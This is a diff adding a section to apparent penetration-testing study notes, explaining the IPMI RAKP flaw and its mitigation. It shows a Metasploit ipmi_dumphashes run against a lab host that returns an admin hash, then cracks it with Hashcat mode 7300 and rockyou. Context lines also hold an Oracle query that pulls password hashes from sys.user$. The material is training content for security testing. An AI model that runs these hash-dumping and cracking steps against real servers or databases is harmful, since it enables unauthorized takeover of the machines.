@@ -420,3 +420,38 @@ pull the hashes for the other accounts
 ```sql
 SQL> select name, password from sys.user$;
 ```
+
+The Intelligent Platform Management Interface (IPMI) is a standardized protocol used for out-of-band management of servers through a dedicated hardware component called the Baseboard Management Controller (BMC). IPMI operates independently of the host operating system, BIOS, CPU, and firmware, allowing administrators to manage systems even when they are powered off, unresponsive, or experiencing hardware failures. Common management capabilities include power control, BIOS configuration, hardware monitoring, remote console access, and operating system reinstallation.
+
+IPMI typically communicates over UDP port 623 and is widely implemented by enterprise vendors such as Dell (iDRAC), HP (iLO), and Supermicro. Because BMCs have near-physical access to the system, unauthorized access to IPMI represents a critical security risk. During internal penetration tests, exposed IPMI interfaces are frequently discovered on internal networks, often with weak or default credentials.
+
+Footprinting IPMI begins by identifying UDP port 623 using Nmap and fingerprinting the service with the ipmi-version NSE script to determine protocol version and authentication capabilities. Most modern systems use IPMI version 2.0, which is vulnerable to a design flaw in the RAKP authentication protocol. During authentication, the BMC sends a salted SHA1 or MD5 password hash to the client before verifying credentials. This behavior allows an attacker to extract password hashes for valid IPMI users without authentication.
+
+Tools such as Metasploit’s ipmi_dumphashes module can retrieve these hashes, which can then be cracked offline using Hashcat mode 7300. Many IPMI passwords are short, default, or reused across systems, making them highly susceptible to cracking. Successful compromise of IPMI credentials often leads to full system control and can enable further lateral movement through credential reuse.
+
+Because the vulnerability is inherent to the IPMI specification, mitigation relies on strong, unique passwords, strict network segmentation, and limiting access to BMC interfaces. IPMI should always be assessed during internal penetration tests due to its prevalence and high-impact risk.
+
+
+```metsploit
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.129.165.125
+RHOSTS => 10.129.165.125
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
+[+] 10.129.165.125:623 - IPMI - Hash found: admin:5fb6b4368200000014169993b700e0247cf284945e641d04fc2fa8c1a843571ea630f7c4cf0881cfa123456789abcdefa123456789abcdef140561646d696e:af7111ffff02850dacc29c9ac2e18868f97ab6fd
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > 
+```
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ echo "5fb6b4368200000014169993b700e0247cf284945e641d04fc2fa8c1a843571ea630f7c4cf0881cfa123456789abcdefa123456789abcdef140561646d696e:af7111ffff02850dacc29c9ac2e18868f97ab6fd" > password.txt
+                                   
+┌──(kali㉿kali)-[~]
+└─$ cat password.txt        
+5fb6b4368200000014169993b700e0247cf284945e641d04fc2fa8c1a843571ea630f7c4cf0881cfa123456789abcdefa123456789abcdef140561646d696e:af7111ffff02850dacc29c9ac2e18868f97ab6fd
+                                    
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 7300 password.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+```
